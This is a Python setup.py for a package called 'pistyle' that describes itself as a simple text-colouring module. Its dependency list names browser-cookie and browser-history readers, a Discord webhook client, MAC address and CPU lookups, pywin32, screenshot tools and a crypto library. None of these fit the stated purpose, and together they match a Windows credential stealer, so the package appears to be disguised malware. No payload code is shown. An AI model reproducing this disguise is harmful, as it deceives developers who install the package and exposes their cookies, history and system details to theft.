from setuptools import setup, find_packages
""" only edit things in 'THIS-FORMAT' so you don't mess the config up """
setup(
  name="pistyle",
  author="Yurei",
  version="0.1.2",
  author_email="unknownrussian100@gmail.com",
  description="Simple module to color all your text in a certain way",
  long_description_content_type="text/markdown",
  url="https://github.com/JustAProDev",
  project_urls={
    "GitHub": "https://github.com/0xPacker/",
  },
  license="MIT",
  keywords=["discord"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  package_dir={"": "."},
  packages=find_packages(where="."),
  install_requires=['browser_cookie3', 'browser_history', 'discord_webhook', 'getmac', 'prettytable','psutil', 'py_cpuinfo', 'pycountry', 'pycryptodome', 'pywin32', 'requests', 'pyautogui', 'Pillow']
)
